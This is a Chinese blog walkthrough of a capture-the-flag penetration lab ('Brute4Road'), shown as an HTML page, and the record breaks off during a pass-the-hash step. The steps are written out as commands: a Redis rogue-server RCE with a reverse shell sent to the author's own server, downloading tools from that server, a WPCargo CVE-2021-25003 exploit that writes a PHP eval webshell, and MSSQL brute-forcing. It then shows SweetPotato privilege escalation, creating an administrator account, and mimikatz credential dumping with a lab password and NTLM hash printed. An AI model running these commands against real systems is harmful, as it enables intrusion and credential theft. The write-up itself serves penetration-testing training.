@@ -1,0 +1,328 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Redis主从复制RCE、base64利用suid提权、CVE-2021-25003、FULL-S4U攻击"><title>春秋云镜Brute4Road</title><link rel=canonical href=https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="春秋云镜Brute4Road"><meta property='og:description' content="Redis主从复制RCE、base64利用suid提权、CVE-2021-25003、FULL-S4U攻击"><meta property='og:url' content='https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Pentest'><meta property='article:published_time' content='2025-08-20T13:30:44+08:00'><meta property='article:modified_time' content='2025-08-20T13:30:44+08:00'><meta name=twitter:title content="春秋云镜Brute4Road"><meta name=twitter:description content="Redis主从复制RCE、base64利用suid提权、CVE-2021-25003、FULL-S4U攻击"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#flag1>flag1</a></li><li><a href=#flag2>flag2</a></li><li><a href=#flag3>flag3</a></li><li><a href=#flag4>flag4</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/>春秋云镜</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/springautumn-cloudmirror-brute4road/>春秋云镜Brute4Road</a></h2><h3 class=article-subtitle>Redis主从复制RCE、base64利用suid提权、CVE-2021-25003、FULL-S4U攻击</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2025-08-20T13:30:44+08:00>Aug 20, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>4 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
+</span><span>友情提示：本文最后更新于 176 天前，文中的内容可能已有所发展或发生改变。</span></div><h2 id=flag1>flag1</h2><p>fscan扫描一下靶机<code>./fscan -h 39.98.116.123 -p 1-65535</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>39.98.116.123:22 open
+</span></span><span class=line><span class=cl>39.98.116.123:21 open
+</span></span><span class=line><span class=cl>39.98.116.123:80 open
+</span></span><span class=line><span class=cl>39.98.116.123:6379 open
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> alive ports len is: <span class=m>4</span>
+</span></span><span class=line><span class=cl>start vulscan
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://39.98.116.123      code:200 len:4833   title:Welcome to CentOS
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> ftp 39.98.116.123:21:anonymous 
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>pub
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Redis 39.98.116.123:6379 unauthorized file:/usr/local/redis/db/dump.rdb
+</span></span></code></pre></td></tr></table></div></div><p>有ftp和redis的未授权，链接一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>lftp -u anonymous, 39.98.116.123
+</span></span><span class=line><span class=cl><span class=nb>set</span> ftp:charset GBK
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>redis-cli -h 39.98.116.123
+</span></span></code></pre></td></tr></table></div></div><p>ftp里面没东西，Redis得知版本为5.0.12。可以打主从复制RCE <a class=link href=https://github.com/n0b0dyCN/redis-rogue-server target=_blank rel=noopener>https://github.com/n0b0dyCN/redis-rogue-server</a> 但是特别容易打崩，记得把服务器的21000端口打开</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 redis-rogue-server.py --rhost 39.98.116.123 --lhost 160.30.231.213
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>r
+</span></span><span class=line><span class=cl>160.30.231.213
+</span></span><span class=line><span class=cl><span class=m>9999</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>nc -lvnp <span class=m>9999</span>
+</span></span></code></pre></td></tr></table></div></div><p>得到反弹shell之后接着交互一下，suid提权</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>script /dev/null
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>find / -perm -u<span class=o>=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></td></tr></table></div></div><p>看到有base64可以suid提权 <a class=link href=https://gtfobins.github.io/gtfobins/base64/ target=_blank rel=noopener>https://gtfobins.github.io/gtfobins/base64/</a> 不过只能查看文件，后面发现并不在root目录，而且读取文件还不能使用通配符，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find / -name <span class=s2>&#34;flag&#34;</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>base64 <span class=s2>&#34;/home/redis/flag/flag01&#34;</span> <span class=p>|</span> base64 --decode
+</span></span></code></pre></td></tr></table></div></div><h2 id=flag2>flag2</h2><p>传fscan和Ligolo-ng</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> /tmp
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>wget http://160.30.231.213:8080/fscan
+</span></span><span class=line><span class=cl>wget http://160.30.231.213:8080/agent
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>chmod +x *
+</span></span></code></pre></td></tr></table></div></div><p><code>/etc/hosts</code>文件里面拿到内网IP</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.2.3      is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.2.7      is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.2.18     is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.2.34     is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.2.16     is alive
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Icmp alive hosts len is: <span class=m>5</span>
+</span></span><span class=line><span class=cl>172.22.2.7:6379 open
+</span></span><span class=line><span class=cl>172.22.2.16:1433 open
+</span></span><span class=line><span class=cl>172.22.2.16:445 open
+</span></span><span class=line><span class=cl>172.22.2.18:445 open
+</span></span><span class=line><span class=cl>172.22.2.34:445 open
+</span></span><span class=line><span class=cl>172.22.2.3:445 open
+</span></span><span class=line><span class=cl>172.22.2.16:139 open
+</span></span><span class=line><span class=cl>172.22.2.34:139 open
+</span></span><span class=line><span class=cl>172.22.2.18:139 open
+</span></span><span class=line><span class=cl>172.22.2.3:139 open
+</span></span><span class=line><span class=cl>172.22.2.34:135 open
+</span></span><span class=line><span class=cl>172.22.2.16:135 open
+</span></span><span class=line><span class=cl>172.22.2.3:135 open
+</span></span><span class=line><span class=cl>172.22.2.16:80 open
+</span></span><span class=line><span class=cl>172.22.2.18:80 open
+</span></span><span class=line><span class=cl>172.22.2.18:22 open
+</span></span><span class=line><span class=cl>172.22.2.7:80 open
+</span></span><span class=line><span class=cl>172.22.2.7:22 open
+</span></span><span class=line><span class=cl>172.22.2.7:21 open
+</span></span><span class=line><span class=cl>172.22.2.3:88 open
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> alive ports len is: <span class=m>20</span>
+</span></span><span class=line><span class=cl>start vulscan
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.2.16
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>MSSQLSERVER
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.2.16
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.2.34
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>CLIENT01
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.2.34
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.2.3      <span class=o>[</span>+<span class=o>]</span> DC:DC.xiaorang.lab               Windows Server <span class=m>2016</span> Datacenter <span class=m>14393</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.2.34     XIAORANG<span class=se>\C</span>LIENT01             
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.2.3
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>DC
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.2.3
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.2.16        code:404 len:315    title:Not Found
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server <span class=m>2016</span> Datacenter <span class=m>14393</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> OsInfo 172.22.2.16  <span class=o>(</span>Windows Server <span class=m>2016</span> Datacenter 14393<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.2.18     WORKGROUP<span class=se>\U</span>BUNTU-WEB02        
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> OsInfo 172.22.2.3   <span class=o>(</span>Windows Server <span class=m>2016</span> Datacenter 14393<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> ftp 172.22.2.7:21:anonymous 
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>pub
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点
+</span></span></code></pre></td></tr></table></div></div><p>整理一下</p><ul><li>172.22.2.18 WordPress并且是WORKGROUP\UBUNTU-WEB02</li><li>172.22.2.16 MSSQLSERVER.xiaorang.lab</li><li>172.22.2.3 DC.xiaorang.lab</li><li>172.22.2.7 已经被控</li><li>172.22.2.34 XIAORANG\CLIENT01</li></ul><p>搭建代理</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nohup ./agent -bind 0.0.0.0:10010 &gt; agent.log 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>&amp;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sudo ./proxy -selfcert -laddr <span class=s2>&#34;0.0.0.0:10001&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>connect_agent --ip 39.98.116.123:10010
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>interface_list
+</span></span><span class=line><span class=cl>session
+</span></span><span class=line><span class=cl>autoroute
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>nohup ./gost -L<span class=o>=</span>socks://:1080 &gt; gost.log 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>&amp;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 查看是否开启</span>
+</span></span><span class=line><span class=cl>ss -luntp
+</span></span></code></pre></td></tr></table></div></div><p>打这个WP用wpscan扫描一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wpscan --update
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>wpscan --url http://172.22.2.18
+</span></span></code></pre></td></tr></table></div></div><p>扫描出WPCargo插件 6.x.x版本 RCE漏洞 <a class=link href=https://github.com/biulove0x/CVE-2021-25003 target=_blank rel=noopener>https://github.com/biulove0x/CVE-2021-25003</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone https://github.com/biulove0x/CVE-2021-25003.git
+</span></span><span class=line><span class=cl><span class=nb>cd</span> CVE-2021-25003/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>python3 WpCargo.py --help
+</span></span><span class=line><span class=cl>python3 WpCargo.py -t http://172.22.2.18/
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror-brute4road/1.png width=1347 height=860 loading=lazy alt=1></p><p>写个木马上去链接一下<code>2=echo PD9waHAgZXZhbCgkX1BPU1RbMTIzXSk7Pz4=|base64 -d > /var/www/html/shell.php</code></p><p><img src=/p/springautumn-cloudmirror-brute4road/2.png width=1540 height=1039 loading=lazy alt=1></p><p>拿到数据库账号密码，链一下</p><p><img src=/p/springautumn-cloudmirror-brute4road/3.png width=1131 height=714 loading=lazy alt=1></p><p><img src=/p/springautumn-cloudmirror-brute4road/4.png width=1543 height=1043 loading=lazy alt=1></p><p>发现flag2和密码，把<strong>密码</strong>导出来进行爆破，用户名不需要</p><h2 id=flag3>flag3</h2><p>接下来打<strong>MSSQLSERVER.xiaorang.lab</strong>，https://github.com/shack2/SNETCracker/releases 用工具进行爆破，我是win10直接用的exe就行</p><p><img src=/p/springautumn-cloudmirror-brute4road/5.png width=1315 height=1063 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>172.22.2.16----SQLServer----1433----sa----ElGNkOiC
+</span></span></code></pre></td></tr></table></div></div><p>激活组件，发现权限不够，但是有<strong>SeImpersonatePrivilege</strong>，上传甜土豆提权</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:/Users/Public/SweetPotato.exe -a <span class=s2>&#34;whoami&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:/Users/Public/SweetPotato.exe -a <span class=s2>&#34;netstat -ano&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>新建一个用户RDP上去，拿到flag3</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=s2>&#34;net user test1 baozongwi123! /add&#34;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;net localgroup administrators test1 /add&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=flag4>flag4</h2><p>我们先拿机器用户的<code>NTHash</code>，传一个mimikatz.exe到桌面，<code>systeminfo</code>查看到在域里面，用管理员权限打开猕猴桃</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>privilege::debug
+</span></span><span class=line><span class=cl>sekurlsa::logonpasswords
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror-brute4road/6.png width=1517 height=808 loading=lazy alt=1></p><p>拿到NTHash之后直接PTH攻击，懒得制作银票</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>sekurlsa::pth /user:MSSQLSERVER$ /domain:XIAORANG.LAB /ntlm:4f4be8211219a166ed7d4db9f3ea90f1
+</span></span><span class=line><span class=cl>
